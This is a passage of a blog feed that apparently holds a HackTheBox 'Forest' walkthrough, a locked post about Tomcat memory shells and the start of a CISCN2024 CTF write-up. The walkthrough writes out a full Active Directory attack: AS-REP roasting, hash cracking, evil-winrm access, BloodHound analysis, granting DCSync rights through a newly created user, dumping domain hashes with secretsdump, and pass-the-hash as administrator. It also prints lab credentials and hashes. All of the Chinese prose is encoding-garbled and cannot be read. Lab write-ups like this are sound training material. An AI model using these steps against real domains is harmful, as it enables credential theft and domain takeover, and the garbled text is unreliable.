    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>é¶æœºipï¼š10.10.10.161</p><p>æ”»å‡»æœºipï¼š10.10.14.13</p></blockquote><h1 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h1><ul><li>ADåŸŸæ¸—é€æå–</li><li>HoundBloodä½¿ç”¨</li><li>AS-REP Roastingæ”»å‡»</li><li>Hashçˆ†ç ´</li><li>PTHä¼ é€’æ”»å‡»</li><li>æ»¥ç”¨DCSync</li></ul><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><h2 id="nmapæ‰«æ"><a href="#nmapæ‰«æ" class="headerlink" title="nmapæ‰«æ"></a>nmapæ‰«æ</h2><p>æ‹¿nampæ‰«ä¸€ä¸‹ </p><p><code>nmap -sS -sV -sC 10.10.10.161</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240702183037029-68856069.png" alt="image-20240702183019354"></p><p>å‘ç°å­˜åœ¨ç³»ç»Ÿ<code>Windows Server 2016</code>ï¼Œæœ‰<code>DNS</code>æœåŠ¡ï¼Œ<code>Kerberos</code>æœåŠ¡ï¼Œ<code>smb</code>å…±äº«æœåŠ¡ï¼Œ<code>RPC</code>æœåŠ¡ï¼Œæ— webé¡µé¢ï¼Œåªæœ‰ADåŸŸ</p><p>å…ˆå°†åŸŸååŠ åˆ°é…ç½®æ–‡ä»¶ä¸­</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;10.10.10.161  htb.local&quot;</span> &gt;&gt; /etc/hosts</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;10.10.10.161  forest.htb.local&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><blockquote><p>Domain: htb.local</p><p>workgroup: HTB</p></blockquote><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p>å°è¯•åŒ¿åç™»å½•SMBæœåŠ¡</p><p><code>smbclient -L \\10.10.10.161</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240702183130828-1497766679.png" alt="image-20240702183114049"></p><p>ä¹Ÿæ˜¯æ²¡æœ‰ä»€ä¹ˆé‡è¦ä¿¡æ¯</p><h2 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h2><p>å°è¯•ä½¿ç”¨ldapsearchå·¥å…·å°è¯•è·å–åŸŸä¸­çš„ç”¨æˆ·åˆ—è¡¨ï¼Œæ ¹æ®ä¹‹å‰å¾—åˆ°çš„åŸŸå<code>htb.local</code>æ„é€ å¦‚ä¸‹å‘½ä»¤ï¼š</p><p><code>ldapsearch -H ldap://10.10.10.161:389 -x -b &quot;CN=users,DC=htb,DC=local&quot;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240702192629104-1904357355.png" alt="image-20240702192626662"></p><p>ä¹Ÿæ²¡ä»€ä¹ˆé‡è¦çš„ä¿¡æ¯</p><h2 id="RPC"><a href="#RPC" class="headerlink" title="RPC"></a>RPC</h2><p>åˆ©ç”¨RPCè¿œç¨‹è¿‡ç¨‹è°ƒç”¨æšä¸¾ç”¨æˆ·</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿DESKTOP-K196DPF)-[~/MyFile]</span><br><span class="line">â””â”€<span class="comment"># rpcclient -U &quot;&quot; -N 10.10.10.161</span></span><br><span class="line">rpcclient $&gt; enumdomusers</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240702193458453-2004846275.png" alt="image-20240702193457026"></p><p>å…ˆå°†ç”¨æˆ·åæ•´ç†å‡ºæ¥</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Administrator</span><br><span class="line">Guest</span><br><span class="line">krbtgt</span><br><span class="line">DefaultAccount</span><br><span class="line">$331000-VK4ADACQNUCA</span><br><span class="line">SM_2c8eef0a09b545acb</span><br><span class="line">SM_ca8c2ed5bdab4dc9b</span><br><span class="line">SM_75a538d3025e4db9a</span><br><span class="line">SM_681f53d4942840e18</span><br><span class="line">SM_1b41c9286325456bb</span><br><span class="line">SM_9b69f1b9d2cc45549</span><br><span class="line">SM_c75ee099d0a64c91b</span><br><span class="line">SM_1ffab36a2f5f479cb</span><br><span class="line">HealthMailboxc3d7722</span><br><span class="line">HealthMailboxfc9daad</span><br><span class="line">HealthMailboxc0a90c9</span><br><span class="line">HealthMailbox670628e</span><br><span class="line">HealthMailbox968e74d</span><br><span class="line">HealthMailbox6ded678</span><br><span class="line">HealthMailbox83d6781</span><br><span class="line">HealthMailboxfd87238</span><br><span class="line">HealthMailboxb01ac64</span><br><span class="line">HealthMailbox7108a4e</span><br><span class="line">HealthMailbox0659cc1</span><br><span class="line">sebastien</span><br><span class="line">lucinda</span><br><span class="line">svc-alfresco</span><br><span class="line">andy</span><br><span class="line">mark</span><br><span class="line">santi</span><br></pre></td></tr></table></figure><h1 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h1><p>æ‹¿åˆ°äº†ç”¨æˆ·åï¼Œè¿™é‡Œåˆæš´éœ²äº†<code>kerberos</code>ç«¯å£88ã€‚å°è¯•ä¸€ä¸‹<code>AS-REP Roasting</code>æ”»å‡»ã€‚</p><p>å°†ä¸Šé¢çš„ç”¨æˆ·åä¿å­˜ä¸º<code>user.txt</code>æ–‡ä»¶ï¼Œä½¿ç”¨<code>GetNPUsers.py</code>å°è¯•å‘<code>kerberos</code>è¯·æ±‚ä¸éœ€è¦é¢„è®¤è¯çš„ç¥¨æ®</p><p><code>python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py htb.loacl/ -usersfile user.txt  -dc-ip 10.10.10.161</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240702195600622-2128859699.png" alt="image-20240702195558839"></p><p>æ‹¿åˆ°äº†ä¸€ä¸ª<code>svc-alfresco</code>ç”¨æˆ·çš„ä¸éœ€è¦é¢„è®¤è¯çš„ç¥¨æ®<code>hash</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$krb5asrep$23$svc-alfresco@HTB.LOCAL:ebdb0e07d33fac124f8f2366a628920c$fbfa4eaefaece3b6ac1f461570a97940f59e4551f620e061054800b9ce7ae9f86f5b711ef4579b3f9ff2706ab69ad3077ad1e4c81d246d7e83a029dff3837b8452ab50cab25aa6b528dce9584fbb87a37cb3589d09baf8a5e0e4f7e500a53c95772701bc45bca89bfacb2602c9192a121f70346f9436869c60b66573c8f0fbf05a36319686fec69cb54a04e311558fcc6790501776b4b1288ee55489e57131aeb4d944ed3769ccf5a26ff4e4cd418657afc6bd827d874faccde4c4dbbd194eba15ef470c69b39099751446310f18d5f800bc8d38c1f8a2b28064fecc963757f6e583d2afdd87</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>john</code>è¿›è¡Œç ´è§£</p><p>å°†ä¸Šè¿°ç¥¨æ®ä¿å­˜ä¸º<code>hash</code>ï¼Œä½¿ç”¨<code>john</code>çˆ†ç ´<code>hash</code>å€¼</p><p><code>john hash --wordlist=/usr/share/wordlists/rockyou.txt</code></p><p><code>john hash -show</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240702201408699-1289370632.png" alt="image-20240702201407967"></p><p>æ‹¿åˆ°ä¸€ä¸ªå‡­è¯ï¼š<code>svc-alfresco : s3rvice</code></p><p>ä½¿ç”¨<code>evil-winrm</code>è¿œç¨‹è¿æ¥</p><p><code>evil-winrm -i 10.10.10.161 -u &#39;svc-alfresco&#39; -p &#39;s3rvice&#39;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240702202206726-73303224.png" alt="image-20240702202205425"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240704113818861-542849522.png" alt="image-20240704113809977"></p><p>æœ€ååœ¨æ¡Œé¢ä¸Šæ‹¿åˆ°<code>user.txt</code></p><h1 id="ADåŸŸæ¸—é€æƒé™æå‡"><a href="#ADåŸŸæ¸—é€æƒé™æå‡" class="headerlink" title="ADåŸŸæ¸—é€æƒé™æå‡"></a>ADåŸŸæ¸—é€æƒé™æå‡</h1><h2 id="BloodHoundä¿¡æ¯æœé›†"><a href="#BloodHoundä¿¡æ¯æœé›†" class="headerlink" title="BloodHoundä¿¡æ¯æœé›†"></a>BloodHoundä¿¡æ¯æœé›†</h2><p><code>windows</code>æƒé™æå‡æœ‰ä¸€æ¬¾å·¥å…·å«åš<code>BloodHound</code></p><p>è¿™é‡Œä½¿ç”¨çš„æ˜¯kaliçš„<code>BloodHound</code>å·¥å…·</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å…ˆå¯åŠ¨ neo4j</span></span><br><span class="line">neo4j start <span class="comment"># è®¿é—®ç½‘å€é»˜è®¤ç”¨æˆ·åå’Œå¯†ç éƒ½æ˜¯neo4jï¼Œç™»å…¥åä¿®æ”¹å¯†ç å³å¯</span></span><br><span class="line"><span class="comment"># å†å¯åŠ¨ BloodHound</span></span><br><span class="line">bloodhound</span><br><span class="line"><span class="comment"># è¾“å…¥ç”¨æˆ·åå’Œä¿®æ”¹åçš„å¯†ç å³å¯ç™»å½•</span></span><br></pre></td></tr></table></figure><p><code>SharpHound.exe</code>ä¸‹è½½é“¾æ¥ï¼š<a href="https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors">https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors</a></p><p>å°†<code>SharpHound.exe</code>ä¸Šä¼ åˆ°ç›®æ ‡æœºå™¨å¹¶è¿è¡Œï¼Œå³å¯å¾—åˆ°ä¸€ä¸ªzipæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶é‡Œé¢å°±æ˜¯ä¿¡æ¯æœé›†çš„ç»“æœï¼Œå°†å®ƒä¸‹è½½åˆ°æœ¬åœ°</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">upload /root/htb/Machines/forest/SharpHound.exe</span><br><span class="line">./SharpHound.exe</span><br><span class="line">download 20240703005056_BloodHound.zip</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240703154602854-406882194.png" alt="image-20240703154557962"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240703154612998-402889656.png" alt="image-20240703154608670"></p><p>ç™»å½•åˆ°Bloodhoundï¼Œç‚¹å‡»å³è¾¹ä¸Šä¼ æŒ‰é’®ï¼Œå°†è§£å‹åçš„<code>json</code>æ–‡ä»¶æäº¤ä¸Šä¼ </p><p>æˆ‘ä»¬æŸ¥æ‰¾ä¸€ä¸‹æˆ‘ä»¬å·²æœ‰ç”¨æˆ·<code>svc-alfresco</code>ç›¸å…³ä¿¡æ¯</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240703155415163-444323121.png" alt="image-20240703155410634"></p><h2 id="ä¿¡æ¯åˆ†æ"><a href="#ä¿¡æ¯åˆ†æ" class="headerlink" title="ä¿¡æ¯åˆ†æ"></a>ä¿¡æ¯åˆ†æ</h2><p>ç‚¹å‡»å·¦ä¾§<code>Unrolled Group Membership</code>å¯ä»¥å‘ç°ä¸å…¶ç›¸å…³çš„ç”¨æˆ·ç»„å’Œç”¨æˆ·</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240703163424801-1273724818.png" alt="image-20240703163420335"></p><p>é‡ç‚¹çœ‹ä¸‹åŠéƒ¨åˆ†</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240703163326843-375757956.png" alt="image-20240703163322390"></p><p>å¯ä»¥å‘ç°<code>svc-alfresco</code>ç”¨æˆ·å±äº<code>Account Operators</code>ç»„ï¼Œè¯¥ç»„æ˜¯ADåŸŸä¸­çš„ç‰¹æƒç»„ä¹‹ä¸€ï¼Œè¯¥ç»„çš„æˆå‘˜å¯ä»¥åˆ›å»ºå’Œç®¡ç†è¯¥åŸŸä¸­çš„ç”¨æˆ·å’Œç»„å¹¶ä¸ºå…¶è®¾ç½®æƒé™ï¼Œä¹Ÿå¯ä»¥åœ¨æœ¬åœ°ç™»å½•åŸŸæ§åˆ¶å™¨ã€‚ ä½†æ˜¯ï¼Œä¸èƒ½æ›´æ”¹å±äº<code>Administrators</code>æˆ–<code>Domain Admins</code>ç»„çš„è´¦å·ï¼Œä¹Ÿä¸èƒ½æ›´æ”¹è¿™äº›ç»„ã€‚</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240703170207796-1894446677.png" alt="image-20240703170202999"></p><p>ç‚¹å‡»<code>Find Shortest Paths to Domain Admins</code>å¯ä»¥çœ‹åˆ°ä¸Šå›¾ç»“æœ</p><p>å…¶ä¸­ï¼Œä»<code>svc-alfresco</code>åˆ°<code>Domain Admins</code>çš„è·¯å¾„ä¸­å‘ç°ï¼Œ<code>EXCHANGE WINDOWS PERMISSIONS</code>ç»„ä¸<code>Account Operators</code> ç»„æœ‰<code>GenericAll</code>å…³ç³»ï¼Œè¡¨ç¤º<code>EXCHANGE WINDOWS PERMISSIONS</code>ç»„å®Œå…¨ä¿¡ä»»<code>Account Operators</code> ç»„ï¼Œè€Œä¸Šé¢è¿˜æåˆ°<code>svc-alfresco</code>ç”¨æˆ·å±äº<code>Account Operators</code>ç»„ï¼Œä¸”<code>Account Operators</code>ç»„çš„æˆå‘˜å¯ä»¥åˆ›å»ºå’Œç®¡ç†è¯¥åŸŸä¸­çš„ç”¨æˆ·å’Œç»„å¹¶ä¸ºå…¶è®¾ç½®æƒé™ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>Account Operators</code>ç»„çš„æƒé™åˆ›å»ºä¸€ä¸ªæ–°ç”¨æˆ·ï¼Œå°†å…¶æ·»åŠ åˆ°<code>EXCHANGE WINDOWS PERMISSIONS</code>ç»„ï¼ŒåŒæ—¶å¯ä»¥çœ‹åˆ°<code>EXCHANGE WINDOWS PERMISSIONS</code>ç»„çš„æˆå‘˜å¯¹<code>HTB.LOCAL</code>æœ‰<code>WriteDacl</code>æƒé™ï¼Œå¯ä»¥ç”¨æ–°æ·»åŠ çš„ç”¨æˆ·å¯¹<code>HTB.LOCAL</code>çš„<code>WriteDacl</code>æƒé™è¿›è¡Œæ¶æ„åˆ©ç”¨ï¼Œä»è€Œå®ç°ææƒ</p><h2 id="åˆ›å»ºä¸€ä¸ªæ¶æ„ç”¨æˆ·"><a href="#åˆ›å»ºä¸€ä¸ªæ¶æ„ç”¨æˆ·" class="headerlink" title="åˆ›å»ºä¸€ä¸ªæ¶æ„ç”¨æˆ·"></a>åˆ›å»ºä¸€ä¸ªæ¶æ„ç”¨æˆ·</h2><p>å›åˆ°<code>Evil-WinRM</code>ï¼Œå…ˆåˆ©ç”¨<code>ACCOUNT OPERATION</code>çš„æƒé™å»åˆ›å»ºä¸€ä¸ªæ–°çš„ç”¨æˆ·</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user popayw 123abc! /add /domain<span class="comment"># åˆ›å»ºç”¨æˆ·</span></span><br><span class="line">net group <span class="string">&quot;Exchange Windows Permissions&quot;</span> popayw /add<span class="comment"># å°†ç”¨æˆ·æ·»åŠ åˆ°Exchange Windows Permissionsç»„</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240705131624984-738117392.png" alt="image-20240705131611080"></p><p>ç”¨æˆ·åˆ›å»ºå®Œæ¯•ï¼Œå†åˆ©ç”¨<code>WriteDacl</code>æƒé™å»ç»™æˆ‘ä»¬ç”¨æˆ·æ‰€åœ¨ç»„åŠ æƒé™ï¼Œè¿™é‡Œä½¿ç”¨<code>PowerSploit</code>ä¸­çš„<code>powerview.ps1</code>æ¥æ»¥ç”¨<code>WriteDacl</code>æƒé™ï¼Œé€šè¿‡<code>upload</code>å°†<code>powerview.ps1</code>æ–‡ä»¶ä¼ è¿›å»</p><p>è¿è¡Œå‘½ä»¤å¯¼å…¥è„šæœ¬</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">. .\PowerView.ps1</span><br></pre></td></tr></table></figure><p>è¿™æ—¶å€™å°±ä¼šå‘ç°è¿è¡Œ<code>menu</code>æ¨¡å—å¢åŠ </p><ul><li>è¿è¡Œä¹‹å‰</li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240704140311010-817859956.png" alt="image-20240704140302757"></p><ul><li>è¿è¡Œä¹‹å</li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240704140329286-337456579.png" alt="image-20240704140320314"></p><p>å†å®šä¹‰ä¸¤ä¸ªå˜é‡ï¼Œç”¨äºåˆ›å»ºå‡­è¯å¯¹è±¡å¹¶æˆäºˆ <code>DCSync</code> æƒé™ï¼Œå…¶ä¸­<code>Add-DomainObjectAcl</code>æ¨¡å—å¯ä»¥æ·»åŠ <code>DCSync</code>æƒé™</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pass</span> = convertto-securestring <span class="string">&#x27;123abc!&#x27;</span> -AsPlainText -Force</span><br><span class="line"><span class="variable">$cred</span> = New-Object System.Management.Automation.PSCredential (<span class="string">&#x27;HTB\popayw&#x27;</span>, <span class="variable">$pass</span>)</span><br><span class="line">Add-DomainObjectAcl -Credential <span class="variable">$cred</span> -TargetIdentity <span class="string">&quot;DC=htb,DC=local&quot;</span> -PrincipalIdentity popayw -Rights DCSync</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240704142421132-450044665.png" alt="image-20240704142412881"></p><h2 id="DCSyncæ”»å‡»å¯¼å‡ºåŸŸå†…å“ˆå¸Œ"><a href="#DCSyncæ”»å‡»å¯¼å‡ºåŸŸå†…å“ˆå¸Œ" class="headerlink" title="DCSyncæ”»å‡»å¯¼å‡ºåŸŸå†…å“ˆå¸Œ"></a>DCSyncæ”»å‡»å¯¼å‡ºåŸŸå†…å“ˆå¸Œ</h2><ul><li>DCSyncæ”»å‡»åŸç†</li></ul><blockquote><p><strong>ä¸»è¦åˆ©ç”¨çš„æ˜¯åŸŸæ§åˆ¶å™¨ä¹‹é—´çš„æ•°æ®åŒæ­¥å¤åˆ¶</strong></p><p>å½“ä¸€ä¸ª DC (å®¢æˆ·ç«¯ DC)æƒ³ä»å…¶ä»– DC (æœåŠ¡ç«¯ DC)è·å–æ•°æ®æ—¶ï¼Œå®¢æˆ·ç«¯ DC ä¼šå‘æœåŠ¡ç«¯ DC å‘èµ·ä¸€ä¸ª GetNCChanges è¯·æ±‚ã€‚å›åº”çš„æ•°æ®åŒ…æ‹¬éœ€è¦åŒæ­¥çš„æ•°æ®ã€‚<br>å¦‚æœéœ€è¦åŒæ­¥çš„æ•°æ®æ¯”è¾ƒå¤šï¼Œåˆ™ä¼šé‡å¤ä¸Šè¿°è¿‡ç¨‹ã€‚æ¯•ç«Ÿæ¯æ¬¡å›åº”çš„æ•°æ®æœ‰é™ã€‚</p></blockquote><p>ç”¨æˆ·æƒ³è¦å‘èµ·<code>DCSync</code>æ”»å‡»ï¼Œå¿…é¡»è·å¾—ä»¥ä¸‹ä»»ä¸€ç”¨æˆ·çš„æƒé™</p><ul><li>Administratorsç»„å†…çš„ç”¨æˆ·</li><li>Domain Adminsç»„å†…çš„ç”¨æˆ·</li><li>Enterprise Adminsç»„å†…çš„ç”¨æˆ·</li><li>åŸŸæ§åˆ¶å™¨çš„è®¡ç®—æœºå¸æˆ·</li></ul><p>ä¹‹å‰æˆ‘ä»¬å·²ç»åˆ›å»ºäº†ä¸€ä¸ªæœ‰<code>DCSync</code>æƒé™çš„ç”¨æˆ·ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>secretsdump.py</code>å·¥å…·æ‰§è¡Œ <code>DCSync</code> ä»¥è½¬å‚¨ç®¡ç†å‘˜ç”¨æˆ·çš„ <code>NTLM</code> å“ˆå¸Œ</p><p><code>python3 /usr/share/doc/python3-impacket/examples/secretsdump.py popayw:&#39;123abc!&#39;@10.10.10.161</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240704150548072-705369653.png" alt="image-20240704150539216"></p><p>å¯ä»¥çœ‹åˆ°å·²ç»æ‹¿åˆ°æ‰€æœ‰ç”¨æˆ·çš„<code>hash</code>ï¼ŒåŒ…æ‹¬<code>admin</code>ç”¨æˆ·çš„</p><h2 id="PTHä¼ é€’æ”»å‡»è·å–Root"><a href="#PTHä¼ é€’æ”»å‡»è·å–Root" class="headerlink" title="PTHä¼ é€’æ”»å‡»è·å–Root"></a>PTHä¼ é€’æ”»å‡»è·å–Root</h2><p>æ‹¿åˆ°äº†ç®¡ç†å‘˜çš„<code>hash</code>ï¼Œå°±å¯ä»¥é€šè¿‡<code>wmiexec</code>å“ˆå¸Œä¼ é€’æ‹¿åˆ°ç®¡ç†å‘˜ç”¨æˆ·çš„æƒé™</p><p><code>python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 htb.local/administrator@10.10.10.161</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240704151153151-1244754650.png" alt="image-20240704151145045"></p><p>æˆåŠŸæ‹¿åˆ°ç®¡ç†å‘˜ç”¨æˆ·çš„æƒé™</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240704151425592-732615984.png" alt="image-20240704151417342"></p><p>æœ€åä¹Ÿæ˜¯åœ¨<code>desktop</code>è·å–<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">HackTheBoxç¯‡åŸŸæ¸—é€ç³»åˆ—ä¹‹Forest</summary>
    
    
    
    <category term="HackTheBox" scheme="https://www.fomal.cc/categories/HackTheBox/"/>
    
    
    <category term="HTB" scheme="https://www.fomal.cc/tags/HTB/"/>
    
    <category term="åŸŸæ¸—é€" scheme="https://www.fomal.cc/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Javaå†…å­˜é©¬ä¹‹tomcatå†…å­˜é©¬</title>
    <link href="https://www.fomal.cc/posts/bc31a7db.html"/>
    <id>https://www.fomal.cc/posts/bc31a7db.html</id>
    <published>2024-06-15T12:03:06.000Z</published>
    <updated>2024-06-15T12:07:05.095Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="æŠ±æ­‰, è¿™ä¸ªå¯†ç çœ‹ç€ä¸å¤ªå¯¹, è¯·å†è¯•è¯•." data-whm="æŠ±æ­‰, è¿™ä¸ªæ–‡ç« ä¸èƒ½è¢«æ ¡éªŒ, ä¸è¿‡æ‚¨è¿˜æ˜¯èƒ½çœ‹çœ‹è§£å¯†åçš„å†…å®¹.">  <script id="hbeData" type="hbeData" data-hmacdigest="364a40a0dcc1cae62f3e7364796ee6d8363ffc4064d5c14d4fd521132bdb4ec8">a7ae39568c02d7a175b7104c21717a1155a916598a2595d06e26149fdf2fe6bd9bf81602d4d72ad068e3f75f7d2db656590adc2e1ef9e578d91ec408e035e573</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">å†…å®¹è¿˜æ²¡å†™å®Œï¼Œéœ€è¦å¯†ç æ‰èƒ½æŸ¥çœ‹ï¼</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Tomcat å†…å­˜é©¬</summary>
    
    
    
    <category term="Java" scheme="https://www.fomal.cc/categories/Java/"/>
    
    
    <category term="Java" scheme="https://www.fomal.cc/tags/Java/"/>
    
    <category term="Tomcat" scheme="https://www.fomal.cc/tags/Tomcat/"/>
    
    <category term="å†…å­˜é©¬" scheme="https://www.fomal.cc/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>CISCN2024</title>
    <link href="https://www.fomal.cc/posts/f97bea14.html"/>
    <id>https://www.fomal.cc/posts/f97bea14.html</id>
    <published>2024-06-06T10:44:21.000Z</published>
    <updated>2024-06-07T11:01:50.288Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="ç«é”…é“¾è§‚å…‰æ‰“å¡"><a href="#ç«é”…é“¾è§‚å…‰æ‰“å¡" class="headerlink" title="ç«é”…é“¾è§‚å…‰æ‰“å¡"></a>ç«é”…é“¾è§‚å…‰æ‰“å¡</h2><p>å¾®ä¿¡å…¬ä¼—å·è·å¾—æç¤º</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240518092106435-1906075373.jpg" alt="4ce1a2288de3dff3307981a18d0c297"></p><p>æç¤ºè£…æ’ä»¶</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240518093835503-63519121.png" alt="image-20240518093832745"></p><p>ç„¶åå¼€å§‹æ¸¸æˆï¼Œæ”’å¤Ÿ7ç§ä¸åŒçš„é£Ÿç‰©ï¼Œå…‘æ¢å³å¯</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240518092502915-601390575.png" alt="image-20240518092459544"></p><p>flag{y0u_ar3_hotpot_K1ng}</p><h2 id="Power-Trajectory-Diagram"><a href="#Power-Trajectory-Diagram" class="headerlink" title="Power Trajectory Diagram"></a>Power Trajectory Diagram</h2><p>æ‹·æ‰“gptå†™è¯»å–npzæ–‡ä»¶çš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¯»å– .npz æ–‡ä»¶</span></span><br><span class="line">file_path = <span class="string">&#x27;attachment.npz&#x27;</span></span><br><span class="line">data = np.load(file_path)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰“å°æ–‡ä»¶ä¸­çš„æ•°ç»„åç§°</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Arrays in the .npz file:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(data.files)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¿é—®å’Œæ‰“å°æ¯ä¸ªæ•°ç»„</span></span><br><span class="line"><span class="keyword">for</span> array_name <span class="keyword">in</span> data.files:</span><br><span class="line">    array = data[array_name]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\nArray name: <span class="subst">&#123;array_name&#125;</span>&quot;</span>)</span><br><span class="line">    <span 